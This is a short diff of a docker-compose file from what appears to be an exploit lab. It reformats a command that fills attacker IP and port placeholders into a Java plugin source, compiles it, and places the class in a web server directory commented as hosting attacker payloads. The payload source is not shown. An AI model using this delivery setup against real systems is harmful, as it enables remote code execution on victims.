@@ -19,10 +19,10 @@ services:
       - ${PWD}/payload-generator:/src
       - ${PWD}/http-dir:/http
     command: >
-      bash -c "sed -e 's/VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME/${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}/g' \
-        -e 's/VICTIM_TO_ATTACKER_HTTP_PORT/${VICTIM_TO_ATTACKER_HTTP_PORT}/g' Plugin.src.java > Plugin.java \
-        && javac Plugin.java \
-        && cp Plugin.class /http/"
+      bash -c "sed -e 's/VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME/${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}/g'
+      -e 's/VICTIM_TO_ATTACKER_HTTP_PORT/${VICTIM_TO_ATTACKER_HTTP_PORT}/g' Plugin.src.java > Plugin.java
+      && javac Plugin.java 
+      && cp Plugin.class /http/"
   # http server for hosting attacker payloads
   httpd:
     image: httpd:alpine
